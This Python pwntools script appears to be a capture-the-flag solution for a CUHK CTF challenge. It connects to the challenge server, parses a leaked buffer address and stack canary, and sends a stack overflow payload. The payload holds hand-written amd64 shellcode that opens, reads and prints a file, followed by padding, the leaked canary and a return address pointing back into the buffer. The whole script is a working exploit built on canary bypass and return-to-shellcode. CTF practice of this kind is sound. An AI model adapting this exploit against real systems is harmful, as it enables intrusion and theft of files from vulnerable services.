from pwn import *

context.arch = 'amd64'
HOST = 'chall.25.cuhkctf.org'
PORT = 25039
REMOTE_FLAG_PATH = b'compartment.txt'

def exploit():
    # Connect to the remote challenge
    p = remote(HOST, PORT)

    # Parse leaked buffer address
    p.recvuntil(b'renting at ')
    buf_addr_line = p.recvline().strip()
    buf_addr = int(buf_addr_line.split(b',')[0], 16)
    log.info(f"Leaked buffer address: {hex(buf_addr)}")

    # Parse leaked stack canary
    p.recvuntil(b'just HKD ')
    canary_line = p.recvline().strip()
    canary = int(canary_line.split(b' ')[0], 16)
    log.info(f"Leaked stack canary: {hex(canary)}")

    # The shellcode
    code = asm(f"""jmp get_path
    open_file:
        pop rsi
        mov rdi, -100
        xor rdx, rdx
        mov rax, 257
        syscall

        mov rdi, rax
        sub rsp, 0x100
        mov rsi, rsp
        mov rdx, 0x100
        xor rax, rax
        syscall
        
        mov rdx, rax
        mov rdi, 1
        mov rsi, rsp
        mov rax, 1
        syscall

        mov rdi, 0
        mov rax, 60
        syscall

    get_path:
        call open_file
    """)

    shellcode = code + REMOTE_FLAG_PATH + b'\x00'

    # Calculate padding to reach canary offset
    offset_to_canary = 136
    padding = b'A' * (offset_to_canary - len(shellcode))
    saved_rbp = b'B' * 8  # Placeholder for saved frame pointer

    # Construct the final payload
    payload = shellcode + padding + p64(canary) + saved_rbp + p64(buf_addr)
    p.sendline(payload)

    try:
        flag = p.recvall(timeout=5).decode().strip()
        if flag:
            log.success(f"Flag: {flag}")
        else:
            log.warning("No flag received")
    except EOFError:
        log.warning("Connection closed unexpectedly.")
    finally:
        p.close()

if __name__ == '__main__':
    exploit()